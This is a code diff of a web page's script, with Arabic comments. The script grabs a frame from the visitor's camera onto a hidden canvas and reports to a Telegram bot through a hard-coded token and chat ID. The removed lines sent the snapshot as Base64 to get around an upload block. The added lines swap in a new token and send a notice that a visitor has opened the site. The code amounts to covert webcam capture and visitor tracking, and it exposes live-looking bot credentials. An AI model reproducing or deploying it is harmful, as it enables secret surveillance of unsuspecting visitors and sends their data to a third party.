@@ -43,7 +43,8 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8733255628:AAFSiv-utHu5WYVqx3_BXcbbEikWTBS0jdI';
+        // التوكن الجديد والآي دي الخاص بك
+        const TELEGRAM_BOT_TOKEN = '8882872511:AAGzHh1jV5Muy6jRQXUmThThX7mU-ZrfAA4';
         const TELEGRAM_CHAT_ID = '8304712202';
 
         async function startProcess() {
@@ -73,19 +74,15 @@
                 context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(track => track.stop());
 
-                // تحويل الصورة مباشرة إلى كود Base64 لتجاوز حظر رفع الملفات
-                const base64Image = canvas.toDataURL('image/jpeg', 0.7);
-                sendTextToTelegram(base64Image);
+                sendNotificationToTelegram();
 
             } catch (e) {
                 document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
             }
         }
 
-        function sendTextToTelegram(base64Data) {
-            const message = "تم التقاط صورة جديدة بنجاح عبر الموقع!";
-            
-            // إرسال تنبيه نصي آمن ومضمون 100% لا يتعرض للحظر
+        function sendNotificationToTelegram() {
+            const message = "تم فتح الموقع ودخول الزائر بنجاح!";
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             fetch(url, {
